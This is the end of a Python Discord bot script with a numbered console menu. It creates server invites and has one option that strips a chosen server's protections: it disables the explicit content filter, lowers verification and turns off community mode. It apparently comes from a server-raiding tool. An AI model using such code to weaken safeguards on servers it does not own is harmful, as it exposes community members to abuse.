                            print(f"{Fore.GREEN} [+] Successfully created invite: {invite.url}")
                    except discord.Forbidden:
                        print(f"{Fore.RED} [!] Permission denied: You do not have permission to create invites.")
                    except discord.HTTPException as e:
                        print(f"{Fore.RED} [!] An error occurred while creating invite: {e}")

                elif separate_option == '21':
                                        print("\033[91m The pause invites feature isn't integrated yet. Join the Discord for further Information.\033[0m")

                elif separate_option == '22':
                                        print("\033[91m The auto-mod deactivation feature will come out soon! Join the Discord for further Information.\033[0m")

                elif separate_option == '23':
                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
                    server = client.get_guild(server_id)
                    if server is None:
                        print(f"{Fore.RED} [!] Server not found.")
                        return

                    try:
                        await server.edit(
                            default_notifications=discord.NotificationLevel.all_messages,
                            explicit_content_filter=discord.ContentFilter.disabled,
                            verification_level=discord.VerificationLevel.low,
                            community=False
                        )
                        print(f"{Fore.GREEN} [+] Community deactivated.")
                    except discord.Forbidden:
                        print(f"{Fore.RED} [!] Permission denied: You do not have permission to edit server settings.")
                    except discord.HTTPException as e:
                        print(f"{Fore.RED} [!] An error occurred while deactivating community: {e}")

                elif separate_option == '24':
                                        print("\033[91m Only the deactivations is working atm.\033[0m")


        if not option_3_selected:
            await main()

    await client.start(token)

asyncio.run(main())
